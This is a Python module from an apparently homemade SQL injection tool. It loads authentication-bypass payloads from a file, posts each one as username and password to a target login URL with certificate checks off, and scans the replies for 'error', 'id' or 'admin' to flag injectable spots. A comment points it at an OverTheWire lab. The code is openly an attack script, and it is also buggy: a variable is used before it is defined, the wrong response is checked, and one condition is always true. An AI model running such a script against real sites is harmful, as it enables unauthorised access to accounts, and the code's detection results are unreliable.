import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
import sqlite3
import logging
import json
import sys
import sys
import os
import logging

current_directory = os.getcwd()

sys.path.append(current_directory)


attack_type = "authentication bypass SQL injection"
from lib.scripts.headers import Prepare_the_headers
from lib.scripts.headers import headers
from lib.scripts.headers import header
from  lib.regelexpression.patterns import Detect
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from logger.logs import logger
from lib.result.Results import safe_SQLJNG_result
from lib.result.Results import SQLJNG_result_report
from Exceptions.exceptions import SQLJNGStackRangeError
from lib.Stacks.stack import html_response
from Exceptions.exceptions import SQLJNGUserExit
from Exceptions.exceptions import SQLJNGNotOptionSelected
from Exceptions.exceptions import SQLJNGOptionError
from logger.sqljlog import logger as sqljlog


attack_type = "authentication bypass SQL injection"

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""




pattern = r"\berror\b"
htmlpattern = r"\bid\b"
capturesAUTHBYPASS = []

__priority__ = PRIORITY.MEDIUM
__hramfull__ = HARMFULL.MEDIUM


async def err_based_json(urls):
    """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
    try:
        global pattern,htmlpattern 
        done = False 
        filename = "Error_based.txt" 
        current_directory = os.path.dirname(os.path.abspath(__file__)) 
        file_path = os.path.join(current_directory, filename) 

        with open(file_path, "r") as file: 
            payload = file.read() 
            rows = payload.split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows)
            print(f"[{datetime.now()}]",Fore.RED + str(sorted_payload)) 
            requests.packages.urllib3.disable_warnings()  #! Disable SSL warnings for http requests and testing
            req = requests.get(url=urls,verify=False) 
            if req.status_code == 200: 
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls}\n Do you want to send the above payload to the website? ")
                logger.info(f"The website:{urls} is up with the status code:{req.status_code}")

                if ask.lower() == "y": 
                    sqljlog.info(f"Testing:{line if len(line) <50 else line.split("\n")}")

                    for line in sorted_payload.split("\n"):
                        params = { 
                            "username": json.dumps(line),
                            "password": json.dumps(line)
                        }
                        
                        inp = input(Fore.RESET+Fore.LIGHTBLUE_EX+f"JSON payload:\nf{params['username']}\n{params['password']} \npress enter to send the json data to the server:\n press any key to send payloads auto.")
                        logger.info(f"Testing json payload:{params['username']}\n{params['password']} \n enter y to send payloads auto.")
                        if inp == "":
                            ack = requests.post(url=urls, data=params,verify=False) 
                            logger.info("Sending the the parameters to the server:",line)
                            await asyncio.sleep(5) 
                            if "error" in ack.text: 
                                logger.info(f"Could find parameter Error,keyword:{json.dumps(line)}")
                                Detect(ack.text)
                                html_response.push(ack.text)
                                
                            vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE)
                            htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                            if vuln: 
                                logger.info(f"Could find id parameter, keyword:{json.dumps(line)}")
                                Detect(ack.text)
                                await asyncio.sleep(3) 
                                html_response.push(ack.text)
                            
                            if htmlVULN:
                                logger.info(f"Could find error parameter, keyword:{json.dumps(line)}")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)

                            
                            word = "id" in req.text 
                            errword = "error" in req.text
                            if word:
                                logger.info(f"Could find parameter id, keyword:{json.dumps(line)}")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)

                            
                            if errword:
                                logger.info(f"Could find parameter error, keyword:{json.dumps(line)}")
                                Detect(ack.text)
                                await asyncio.sleep(3)
                                html_response.push(ack.text)

                        
                        elif inp == "esc":
                            raise SystemExit
                        
                        elif not inp:
                            try:
                                raise SQLJNGNotOptionSelected
                            finally:
                                logger.info("No inputs by the user povided.")
                            
                        
                        
                        else:
                            try:
                                raise SQLJNGOptionError
                            finally:
                                logger.info("Invalid option.type esc to continue.")
                        
                        
                                
                            
                                
                        if req.status_code == 302: 
                            logger.info(f"Could find injectable area:{line}")
                            done = True
                        
                        if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                            logger.info(f"Could find admin parameter, keyword:{line}")
                            html_response.push(ack.text)

                            
                elif ask.lower() == "n":
                    try:
                        raise SQLJNGUserExit
                    finally:
                        logger.info("Operation canceled by the user.")
                    
                else:
                    try:
                        raise SQLJNGOptionError
                    finally:
                        logger.info("Invalid option.type esc to continue.")
                
            else:
                logger.info(f"Could not connect to the target:{urls} ")

                
        
                        
                    
    except Exception as e:
        logger.error(f"Error: {e}")
        
    except KeyboardInterrupt:
        pass
        
 
        
    finally:
        logger.info("Connection closed\n finished the injection test.")
   
        
        


async def auth_main(urL):
    await err_based_json(urL)

# asyncio.run(err_based_json("https://redtiger.labs.overthewire.org/"))
